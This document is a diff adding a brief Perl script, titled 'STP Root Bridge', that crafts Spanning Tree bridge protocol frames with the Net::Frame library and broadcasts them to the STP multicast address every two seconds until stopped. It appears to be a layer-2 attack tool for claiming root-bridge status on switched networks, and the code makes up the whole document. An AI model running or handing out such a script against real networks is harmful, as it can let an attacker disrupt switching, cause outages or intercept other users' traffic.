@@ -1,0 +1,29 @@
+# STP Root Bridge
+
+use Net::Frame::Layer::LLC qw(:consts);
+use Net::Frame::Layer::STP qw(:consts);
+
+my $STOP = 0;
+local $SIG{'INT'} = sub {
+    $STOP = 1;
+};
+
+$ether  = ETHER(
+    dst  => '01:80:c2:00:00:00',
+    type => 38
+);
+$llc    = Net::Frame::Layer::LLC->new(
+    dsap => NF_LLC_DSAP_STP,
+    ig   => 0,
+    ssap => NF_LLC_SSAP_STP, 
+    cr   => 0
+);
+$stp    = Net::Frame::Layer::STP->new();
+$packet = packet $ether,$llc,$stp;
+
+print $packet->print;
+
+while (!$STOP) {
+    sendp $packet;
+    sleep 2;
+}
